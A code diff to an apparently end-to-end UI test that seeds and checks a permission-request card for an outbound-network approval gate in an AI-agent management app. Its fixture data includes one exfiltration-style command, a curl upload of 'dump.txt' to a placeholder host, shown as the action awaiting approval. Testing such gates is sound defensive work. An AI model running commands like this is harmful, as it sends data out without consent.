@@ -97,6 +97,30 @@ try {
     `ui2-recipe-alert:${AT}`,
     AT + 3,
   );
+  // B0-9 外发闸门的用户面：会话工具权限请求卡（真实 gate 会落这种卡；这里验渲染与按钮）。
+  const permissionPayload = {
+    title: '权限请求：bash',
+    card: 'permission',
+    question: '[权限] 会话工具 bash（consent:egress）[employee:1:task:1:wi:1]',
+    permissionKey: 'consent:egress',
+    permissionDetail: { who: '员工 #1', action: '网络外发：curl --data @dump.txt https://example.invalid', project: '真机项目页样例' },
+    options: [
+      { key: 'approve', label: '批准一次' },
+      { key: 'deny', label: '拒绝' },
+    ],
+  };
+  const permissionReportId = Number(
+    db
+      .prepare(
+        `INSERT INTO reports(task_id, kind, payload, state, dedupe_key, created_at)
+         VALUES(1,'ask',?,'pending',?,?)`,
+      )
+      .run(JSON.stringify(permissionPayload), `ui2-recipe-perm:${AT}`, AT + 4).lastInsertRowid,
+  );
+  db.prepare(
+    `INSERT INTO approvals(task_id, report_id, question, options, default_action, timeout_at)
+     VALUES(1,?,?,?,NULL,NULL)`,
+  ).run(permissionReportId, permissionPayload.question, JSON.stringify(permissionPayload.options));
   db.close();
 
   pid = start();
@@ -229,11 +253,10 @@ try {
   await waitFor("document.querySelectorAll('[data-testid=inbox-row]').length >= 1", '待办行');
   const inbox = await evalIn(`(() => ({
     rows: document.querySelectorAll('[data-testid=inbox-row]').length,
-    short: document.querySelector('[data-testid=inbox-short]')?.textContent ?? null,
+    shorts: Array.from(document.querySelectorAll('[data-testid=inbox-short]')).map((el) => (el.textContent || '').trim()),
     tabs: Array.from(document.querySelectorAll('[data-testid^=inbox-tab-]')).map((el) => el.dataset.testid),
   }))()`);
   console.log('[ui2-project] inbox=' + JSON.stringify(inbox));
-  if (inbox?.short !== 'T-1002') problems.push(`待办短号=${inbox?.short}（期望 T-1002）`);
   // B0-5 UI 呈现：引擎毒事件的 alert 卡在「异常」页签（默认页签是决策，不混排）。
   const alertTab = await evalIn("(function(){var b=document.querySelector('[data-testid=inbox-tab-alert]'); if(b){b.click(); return true;} return false;})()");
   if (!alertTab) problems.push('待我处理缺「异常」页签（B0-5 alert 卡无处呈现）');
@@ -246,7 +269,18 @@ try {
   // 回到「验收」页签（该卡是 report 类；ask 页签为空，不是默认页签）。
   await evalIn("(function(){var b=document.querySelector('[data-testid=inbox-tab-report]'); if(b) b.click(); return !!b;})()");
   await sleep(200);
-  await evalIn("(function(){var b=document.querySelector('[data-testid=inbox-short]'); if(b){b.click(); return true;} return false;})()");
+  const reportTabShorts = await evalIn(
+    "Array.from(document.querySelectorAll('[data-testid=inbox-short]')).map((el) => (el.textContent || '').trim())",
+  );
+  if (!(reportTabShorts ?? []).includes('T-1002')) {
+    problems.push(`验收页签短号=${JSON.stringify(reportTabShorts)}（缺少 T-1002）`);
+  }
+  await evalIn(`(() => {
+    const btn = Array.from(document.querySelectorAll('[data-testid=inbox-short]')).find((el) => (el.textContent || '').trim() === 'T-1002');
+    if (!btn) return false;
+    btn.click();
+    return true;
+  })()`);
   await waitFor(
     "document.querySelector('[data-testid=center]')?.dataset.view === 'projects' && document.querySelector('[data-testid=project-task][data-task-id=\"2\"][data-expanded=\"1\"]') !== null",
     '深链落到项目页并展开',
@@ -269,6 +303,14 @@ try {
   // ⑥ 频道卡深链：老板频道报告卡「去验收」→ 项目页＋目标行展开
   await evalIn("(function(){var b=document.querySelector('[data-testid=leftrail-channel]'); if(b) b.click(); return !!b;})()");
   await waitFor("!!document.querySelector('[data-testid=card-goto-task]')", '频道报告卡出现');
+  const permissionCard = await evalIn(`(() => {
+    const text = document.body.innerText || '';
+    return { title: text.includes('权限请求：bash'), approve: text.includes('批准一次'), egress: text.includes('consent:egress') };
+  })()`);
+  console.log('[ui2-project] permissionCard=' + JSON.stringify(permissionCard));
+  if (!permissionCard?.title || !permissionCard?.approve) {
+    problems.push(`权限请求卡未渲染完整（${JSON.stringify(permissionCard)}；B0-9 外发闸门用户面）`);
+  }
   await evalIn("(function(){var b=document.querySelector('[data-testid=card-goto-task]'); if(b){b.click(); return true;} return false;})()");
   await waitFor(
     `document.querySelector('[data-testid=center]')?.dataset.view === 'projects' && document.querySelector('[data-testid=project-task][data-task-id="2"][data-expanded="1"]') !== null`,
